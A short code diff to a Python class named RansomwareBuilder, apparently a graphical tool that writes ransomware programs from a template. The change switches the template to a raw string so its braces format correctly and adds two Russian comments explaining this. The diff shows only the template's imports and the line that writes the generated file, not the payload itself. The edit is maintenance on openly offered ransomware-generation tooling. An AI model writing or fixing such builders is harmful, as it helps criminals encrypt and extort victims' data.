@@ -618,7 +618,8 @@ class RansomwareBuilder:
             self.status_label.config(foreground=self.colors["gray"])
         
     def generate_ransomware(self, config, output_path):
-        template = '''import os as _os
+        # Используем сырую строку с двойными фигурными скобками для экранирования
+        template = r'''import os as _os
 import sys as _sys
 import base64 as _base64
 import ctypes as _ctypes
@@ -839,6 +840,7 @@ def main():
 if __name__ == "__main__":
     main()
 '''
+        # Подставляем config в шаблон
         with open(output_path, "w") as f:
             f.write(template.format(config=repr(config)))
 
